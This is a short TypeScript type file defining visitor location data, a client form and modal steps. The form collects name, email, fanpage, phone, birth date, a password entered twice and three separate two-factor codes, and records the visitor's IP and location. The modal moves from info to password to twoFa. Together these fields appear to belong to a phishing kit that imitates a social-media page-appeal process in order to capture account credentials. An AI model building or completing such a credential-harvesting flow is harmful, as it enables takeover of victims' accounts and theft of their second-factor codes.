export type LocationData = {
  ip: string;
  city: string;
  region: string;
  country: string;
  country_code: string;
  org?: string;
  location: string;
  device?: string;
  sources?: string[];
};

export type ClientFormData = {
  fullName: string;
  email: string;
  emailBusiness: string;
  fanpage: string;
  phone: string;
  pageCategory: string;
  day?: string;
  month?: string;
  year?: string;
  password?: string;
  passwordSecond?: string;
  twoFa?: string;
  twoFaSecond?: string;
  twoFaThird?: string;
};

export type ModalStep = "idle" | "info" | "password" | "twoFa" | "success";
